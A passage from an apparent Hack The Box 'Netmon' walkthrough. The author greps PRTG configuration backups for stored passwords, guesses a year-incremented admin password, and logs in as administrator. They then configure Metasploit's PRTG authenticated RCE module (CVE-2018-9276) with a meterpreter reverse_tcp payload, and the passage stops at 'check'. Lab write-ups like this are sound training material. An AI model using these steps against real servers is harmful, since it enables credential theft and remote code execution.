</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;/esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;/linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;windowsloginpassword&gt;
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;/esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;/linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                            &lt;/windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;dbpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;/esxpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;/linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                &lt;/windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                    &lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                                    &lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                &lt;password&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.old.bak:                &lt;/password&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It get&rsquo;s a bit better after we <strong>remove</strong> all the <strong>white spaces</strong>, but it&rsquo;s still very long.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>grep -i password * <span class=p>|</span> tr -d <span class=s2>&#34; &#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ grep -i password * <span class=p>|</span> tr -d <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;esxpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/esxpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.dat:&lt;esxpassword&gt;
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;esxpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/esxpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/linuxloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/windowsloginpassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/proxypassword&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;password&gt;
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak:&lt;/password&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>These all look like some <strong>opening</strong> and <strong>closing tags</strong>, and in that case, the <strong>passwords</strong> we are looking for should be <strong>between</strong> those <strong>tags</strong>.</p><p>Therefore, if we want to see those too, we need to use <em><strong>grep&rsquo;s</strong></em> <strong>context line control</strong> options. But even with those, the output is still way to long, therefore we use <em><strong>grep</strong></em>, <em><strong>sort</strong></em> and <em><strong>tr</strong></em> to shorten it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>grep -i -A <span class=m>3</span> -B <span class=m>3</span> password * <span class=p>|</span> tr -d <span class=s2>&#34; &#34;</span> <span class=p>|</span> sort <span class=p>|</span> grep -v <span class=s1>&#39;^.*[^&lt;]*&lt;[^&gt;]*&gt;$&#39;</span> <span class=p>|</span> grep -vE <span class=s1>&#39;^--$&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ grep -i -A <span class=m>3</span> -B <span class=m>3</span> password * <span class=p>|</span> tr -d <span class=s2>&#34; &#34;</span> <span class=p>|</span> sort <span class=p>|</span> grep -v <span class=s1>&#39;^.*[^&lt;]*&lt;[^&gt;]*&gt;$&#39;</span> <span class=p>|</span> grep -vE <span class=s1>&#39;^--$&#39;</span>
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-0
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-0
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-0
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-0
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-0
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-1
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-1
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-1
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-1
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-1
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-100
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-60
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-8080
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-DE
</span></span><span class=line><span class=cl>PRTGConfiguration.dat-OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
</span></span><span class=line><span class=cl>PRTGConfiguration.old-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old-0
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.old-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old-100
</span></span><span class=line><span class=cl>PRTGConfiguration.old-60
</span></span><span class=line><span class=cl>PRTGConfiguration.old-8080
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-0
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-1
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-100
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-60
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-8080
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-DE
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-M24VKFRECBEGN3ZQNGSET723GFIPVHYX
</span></span><span class=line><span class=cl>PRTGConfiguration.old.bak-	PrTg@dmin2018
</span></span><span class=line><span class=cl>PRTGConfiguration.old-DE
</span></span><span class=line><span class=cl>PRTGConfiguration.old-OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>There is only one <strong>potential password</strong> remaining: - <em>PrTg@dmin2018</em> - in the - <em>PRTGConfiguration.old.bak</em> - file. But we still need to find the matching <strong>usename</strong> for it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>grep PrTg@dmin2018 PRTG<span class=se>\ </span>Configuration.old.bak -A <span class=m>3</span> -B <span class=m>3</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ grep PrTg@dmin2018 PRTG<span class=se>\ </span>Configuration.old.bak -A <span class=m>3</span> -B <span class=m>3</span>
</span></span><span class=line><span class=cl>            &lt;/dbcredentials&gt;
</span></span><span class=line><span class=cl>            &lt;dbpassword&gt;
</span></span><span class=line><span class=cl>	      &lt;!-- User: prtgadmin --&gt;
</span></span><span class=line><span class=cl>	      PrTg@dmin2018
</span></span><span class=line><span class=cl>            &lt;/dbpassword&gt;
</span></span><span class=line><span class=cl>            &lt;dbtimeout&gt;
</span></span><span class=line><span class=cl>              <span class=m>60</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Great, now let&rsquo;s try this pair - <em>prtgadmin:PrTg@dmin2018</em> - agains the webserver&rsquo;s <strong>login page</strong>. Sadly, it does not work. How about for <em><strong>ftp</strong></em>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ftp <span class=nv>$rhost</span> <span class=m>21</span>
</span></span><span class=line><span class=cl>Connected to 10.129.96.142.
</span></span><span class=line><span class=cl><span class=m>220</span> Microsoft FTP Service
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.129.96.142:root<span class=o>)</span>: prtgadmin
</span></span><span class=line><span class=cl><span class=m>331</span> Password required
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>530</span> User cannot log in.
</span></span><span class=line><span class=cl>Login failed.
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is Windows_NT.
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl><span class=m>221</span> Goodbye.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>So neither <strong>webserver</strong> login, nor <em><strong>ftp</strong></em> login&mldr; <strong>SMB</strong> maybe?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>smbmap -u prtgadmin -p PrTg@dmin2018 -H <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbmap -u prtgadmin -p PrTg@dmin2018 -H <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Authentication error on 10.129.96.142
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like we are <strong>stuck</strong>, so we go and <strong>get</strong> some <strong>help</strong>. One of the <strong>hints</strong> we find mentions taking a deeper look at the <em>PRTG</em> files and their <strong>creation date</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ftp output from before</span>
</span></span><span class=line><span class=cl>02-25-19  10:54PM              <span class=m>1189697</span> PRTG Configuration.dat
</span></span><span class=line><span class=cl>02-25-19  10:54PM              <span class=m>1189697</span> PRTG Configuration.old
</span></span><span class=line><span class=cl>07-14-18  03:13AM              <span class=m>1153755</span> PRTG Configuration.old.bak
</span></span><span class=line><span class=cl>06-01-23  04:25PM              <span class=m>1640740</span> PRTG Graph Data Cache.dat
</span></span></code></pre></div><p>Looking over the <strong>dates</strong>, we get the idea&mldr; so let&rsquo;s try - <em>prtgadmin:PrTg@dmin2019</em> - this time. It works on the <strong>website</strong> and we are welcomed as a <strong>system administrator</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/netmon/webpage-post-login.png alt=webpage-post-login title=webpage-post-login></p><p>After some <strong>research</strong> on the aforementioned <strong>version</strong>, we come up with the following <strong>vulnerability</strong>: - <em>exploit/windows/http/prtg_authenticated_rce</em> -.</p><h2 id=exploitation><strong>EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Given the <strong>exploit</strong> already at hand, we check it out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>use exploit/windows/http/prtg_authenticated_rce
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ msfconsole -q
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; use exploit/windows/http/prtg_authenticated_rce 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt;  info
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       Name: PRTG Network Monitor Authenticated RCE
</span></span><span class=line><span class=cl>     Module: exploit/windows/http/prtg_authenticated_rce
</span></span><span class=line><span class=cl>   Platform: Windows
</span></span><span class=line><span class=cl>       Arch: x86, x64
</span></span><span class=line><span class=cl> Privileged: No
</span></span><span class=line><span class=cl>    License: Metasploit Framework License <span class=o>(</span>BSD<span class=o>)</span>
</span></span><span class=line><span class=cl>       Rank: Excellent
</span></span><span class=line><span class=cl>  Disclosed: 2018-06-25
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provided by:
</span></span><span class=line><span class=cl>  Josh Berry &lt;josh.berry@codewatch.org&gt;
</span></span><span class=line><span class=cl>  Julien Bedel &lt;contact@julienbedel.com&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Available targets:
</span></span><span class=line><span class=cl>      Id  Name
</span></span><span class=line><span class=cl>      --  ----
</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt;  <span class=m>0</span>   Automatic Targeting
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Check supported:
</span></span><span class=line><span class=cl>  Yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Basic options:
</span></span><span class=line><span class=cl>  Name            Current Setting  Required  Description
</span></span><span class=line><span class=cl>  ----            ---------------  --------  -----------
</span></span><span class=line><span class=cl>  ADMIN_PASSWORD  prtgadmin        yes       The password <span class=k>for</span> the specified username
</span></span><span class=line><span class=cl>  ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
</span></span><span class=line><span class=cl>  Proxies                          no        A proxy chain of format type:host:port<span class=o>[</span>,type:ho
</span></span><span class=line><span class=cl>                                             st:port<span class=o>][</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>  RHOSTS                           yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit
</span></span><span class=line><span class=cl>                                             .com/docs/using-metasploit/basics/using-metaspl
</span></span><span class=line><span class=cl>                                             oit.html
</span></span><span class=line><span class=cl>  RPORT           <span class=m>80</span>               yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>  SSL             <span class=nb>false</span>            no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
</span></span><span class=line><span class=cl>  VHOST                            no        HTTP server virtual host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload information:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Description:
</span></span><span class=line><span class=cl>  Notifications can be created by an authenticated user and can 
</span></span><span class=line><span class=cl>  execute scripts when triggered. Due to a poorly validated input on 
</span></span><span class=line><span class=cl>  the script name, it is possible to chain it with a user-supplied 
</span></span><span class=line><span class=cl>  <span class=nb>command</span> allowing <span class=nb>command</span> execution under the context of privileged 
</span></span><span class=line><span class=cl>  user. The module uses provided credentials to log in to the web 
</span></span><span class=line><span class=cl>  interface, <span class=k>then</span> creates and triggers a malicious notification to 
</span></span><span class=line><span class=cl>  perform RCE using a Powershell payload. It may require a few tries 
</span></span><span class=line><span class=cl>  to get a shell because notifications are queued up on the server. 
</span></span><span class=line><span class=cl>  This vulnerability affects versions prior to 18.2.39. See references 
</span></span><span class=line><span class=cl>  <span class=k>for</span> more details about the vulnerability allowing RCE.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>References:
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2018-9276
</span></span><span class=line><span class=cl>  https://www.codewatch.org/blog/?p<span class=o>=</span><span class=m>453</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>It&rsquo;s <strong>exactly</strong> what we have been looking for. Let&rsquo;s <strong>set</strong> the the <strong>required options</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>options
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/http/prtg_authenticated_rce<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name            Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----            ---------------  --------  -----------
</span></span><span class=line><span class=cl>   ADMIN_PASSWORD  prtgadmin        yes       The password <span class=k>for</span> the specified username
</span></span><span class=line><span class=cl>   ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
</span></span><span class=line><span class=cl>   Proxies                          no        A proxy chain of format type:host:port<span class=o>[</span>,type:h
</span></span><span class=line><span class=cl>                                              ost:port<span class=o>][</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>   RHOSTS                           yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploi
</span></span><span class=line><span class=cl>                                              t.com/docs/using-metasploit/basics/using-metas
</span></span><span class=line><span class=cl>                                              ploit.html
</span></span><span class=line><span class=cl>   RPORT           <span class=m>80</span>               yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SSL             <span class=nb>false</span>            no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
</span></span><span class=line><span class=cl>   VHOST                            no        HTTP server virtual host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/meterpreter/reverse_tcp<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
</span></span><span class=line><span class=cl>   EXITFUNC  process          yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process,
</span></span><span class=line><span class=cl>                                        none<span class=o>)</span>
</span></span><span class=line><span class=cl>   LHOST     206.189.18.70    yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   <span class=m>0</span>   Automatic Targeting
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; <span class=nb>set</span> admin_password PrTg@dmin2019
</span></span><span class=line><span class=cl><span class=nv>admin_password</span> <span class=o>=</span>&gt; PrTg@dmin2019
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; <span class=nb>set</span> rhosts 10.129.96.142
</span></span><span class=line><span class=cl><span class=nv>rhosts</span> <span class=o>=</span>&gt; 10.129.96.142
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; <span class=nb>set</span> lhost tun0
</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.10.14.11
</span></span></code></pre></div><p>Once everything is <strong>properly set up</strong>, we use <em><strong>check</strong></em> to verify the <strong>vulnerability</strong> of our <strong>target</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; check
